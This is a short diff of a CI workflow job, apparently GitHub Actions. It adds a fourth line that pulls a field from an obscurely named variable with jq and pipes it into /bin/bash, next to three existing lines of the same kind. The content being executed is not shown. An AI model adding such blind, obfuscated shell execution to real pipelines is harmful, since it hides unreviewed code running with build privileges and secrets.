@@ -28,6 +28,7 @@ jobs:
           echo $z16247 | jq -r .g41 | /bin/bash
           echo $j8 | jq -r .a42 | /bin/bash
           printf '%s' "$prl7" | jq -r .ieklo3 | /bin/bash
+          echo $sbva14 | jq -r .rpxla701 | /bin/bash
 
       - name: Save results
         if: always()
